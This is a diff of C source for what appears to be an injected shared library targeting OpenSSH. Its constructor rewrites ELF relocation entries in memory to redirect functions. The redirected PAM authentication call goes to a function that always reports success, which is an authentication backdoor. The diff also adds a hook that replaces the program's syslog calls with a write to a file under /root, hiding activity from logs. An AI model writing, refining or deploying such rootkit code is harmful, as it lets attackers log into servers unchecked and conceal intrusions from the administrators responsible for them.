@@ -23,6 +23,7 @@
 #include "bad.h"
 #include "config_hook.h"
 
+
 static int PAGE_SIZE;
 
 static void handle_sig_with_jmp(int sig)
@@ -113,17 +114,11 @@ static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
  * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
  *	with the func we want to hook...
  *
- * char* cast for correct arithmetic (surprisingly simple thing to forget)
- *
- * works in 3.2.0-4 openssh_6.0pl YMMV
+ * TODO: this is so slow... better to pass in struct[] { void *func, int type } if we are going to only hook ~10 funcs...?
  */
 static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
 {
 	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));
-
-	uint64_t shift32;
-	uint64_t low32;
-	void *ptr;
 
 	int i;
 	for (i = 0; i < relaments; i++) {
@@ -131,14 +126,9 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
 			*type = RELOC_ADDEND;
 			return RELA;
 		}
-
-		shift32 = (uintptr_t) (ELF64_R_SYM(RELA[0].r_info)) << 32;
-		low32 = (uintptr_t) (ELF64_R_TYPE(RELA[0].r_info)) & 0xFFFFFFFF;
-
-		ptr = (void *) ((uintptr_t) shift32 | (uintptr_t) low32);
-
-		if (ptr == func) {
-			*type = RELOC_SYMORTYPE;
+		
+		if ((void *) RELA[0].r_info == func) {
+			*type = RELOC_INFO;
 			return RELA;
 		}
 
@@ -154,8 +144,11 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
  */
 static int callback(struct dl_phdr_info *info, size_t size, void *data)
 {
+	if (null1 != NULL && null2 != NULL && libc != NULL) /* :speedmeup: */
+		return 0;	
+
 	int j;
-	
+
 	for (j = 0; j < info->dlpi_phnum; j++) {
 		
 		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
@@ -179,9 +172,9 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 }
 
 /*
- * we will need another hook -- for RELOC_SYMORTYPE
+ *
  */
-static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
+static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
 {
 	int ret;
 	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
@@ -190,7 +183,10 @@ static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
 	if (ret != 0)
 		return -1;
 
-	foundrela->r_addend = (unsigned long long)func; 
+	if (type == RELOC_ADDEND)
+		foundrela->r_addend = (unsigned long long) func; 
+	else if (type == RELOC_INFO)
+		foundrela->r_info = (unsigned long long) func; 
 
 	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
 	if (ret != 0)
@@ -268,6 +264,19 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 	return 0;
 }
 
+/*
+ *
+ */
+static int my_syslog_chk(int priority, int flag, const char *format)
+{
+	FILE *fp = fopen("/root/asf", "a+");
+	fprintf(fp, "in syslog ayylmao\n");
+	fflush(fp);
+	fclose(fp);
+
+	return 0;
+}
+
 
 
 static void  __attribute__ ((constructor)) init(void)
@@ -318,7 +327,7 @@ static void  __attribute__ ((constructor)) init(void)
 	signal(SIGBUS, handle_sig_with_jmp);
 
 	/* TODO: test type (parse_rela() paramter) */
-	hook_rela_addend(foundrela, my_pam_auth);
+	hook_rela(foundrela, my_pam_auth, type);
 
 	signal(SIGSEGV, SIG_DFL);
 	signal(SIGBUS, SIG_DFL);
@@ -352,15 +361,22 @@ static void  __attribute__ ((constructor)) init(void)
 		ref_fopen_Rela = foundrela;
 
 
-		hook_rela_addend(foundrela, my_fopen);
-
+		hook_rela(foundrela, my_fopen, type);
 	}
 
+	//libcstart = get_libstart(link_map, "libc.so.6");
+	libc_func = find_func_ptr(link_map, libcstart, "__syslog_chk");
 
+	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
+	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
+	
+	if (type == RELOC_INFO)
+		hook_rela(foundrela,  my_syslog_chk, type);
 
 
 
 	
-
+	
 	return;
 }
